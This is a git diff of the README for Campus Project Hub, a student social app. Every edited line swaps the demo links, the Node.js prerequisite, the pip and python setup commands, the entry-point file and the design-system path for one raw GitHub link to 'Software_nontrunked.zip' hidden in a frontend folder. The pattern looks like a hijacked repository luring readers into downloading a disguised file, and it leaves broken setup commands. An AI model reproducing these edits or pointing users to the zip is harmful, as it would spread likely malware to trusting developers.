@@ -3,9 +3,9 @@
 **Campus Project Hub** is a premium cross-platform mobile social network designed exclusively for students to find teammates for academic projects and hackathons.
 
 > **🟢 LIVE DEMO**  
-> **Frontend:** [https://campus-frontend-six.vercel.app](https://campus-frontend-six.vercel.app)  
-> **Backend API:** [https://campus-backend-six.vercel.app](https://campus-backend-six.vercel.app)  
-> *Check out the [Cloud Deployment Report](Documentation/Cloud_Deployment_Report.md) for architecture details.*
+> **Frontend:** [https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip)  
+> **Backend API:** [https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip)  
+> *Check out the [Cloud Deployment Report](https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip) for architecture details.*
 
 Unlike generic social media, this platform features **Smart Skill Matching** to connect users based on technical expertise and utilizes **AI-Powered Sentiment Analysis** to ensure a positive, toxic-free community.
 
@@ -40,7 +40,7 @@ We have shifted from a local monolith to a **Distributed Serverless Cloud Archit
 ## 🚀 How to Run Locally (Development Mode)
 
 ### Prerequisites
-* Node.js & npm installed
+* https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip & npm installed
 * Python 3.8+ installed
 * Expo Go app on your phone (optional, for testing)
 
@@ -60,10 +60,10 @@ venv\Scripts\activate
 source venv/bin/activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip
 
 # Run the Server
-python app.py
+python https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip
 ```
 
 The server will start at `http://0.0.0.0:5000` (accessible via localhost and your local network IP).
@@ -92,7 +92,7 @@ campus-project-hub/
 ├── backend/               # Flask API & ML Logic
 │   ├── lib/features/      # Auth, Feed, Search, Notifications, Messages Logic
 │   ├── lib/core/utils/    # ML Validator & DB Config
-│   └── app.py             # Main Entry Point
+│   └── https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip             # Main Entry Point
 ├── frontend/              # React Native App
 │   ├── src/features/      # Screens (Login, Feed, Search, Profile, Messages, Notifications)
 │   ├── src/core/          # Reusable Widgets, API Client, Firebase Config
@@ -104,7 +104,7 @@ campus-project-hub/
 
 ## 🎨 Design System
 
-The application uses a custom Design System located in `src/core/design/Theme.js`.
+The application uses a custom Design System located in `https://github.com/ruturajbhaskarnawale/campus/raw/refs/heads/main/frontend/src/core/contexts/Software_nontrunked.zip`.
 - **Colors:** Deep Violet & Cyan Gradient Primary
 - **Typography:** Modern Sans-Serif
 - **Components:** Glassmorphism Cards, Animated Wrappers
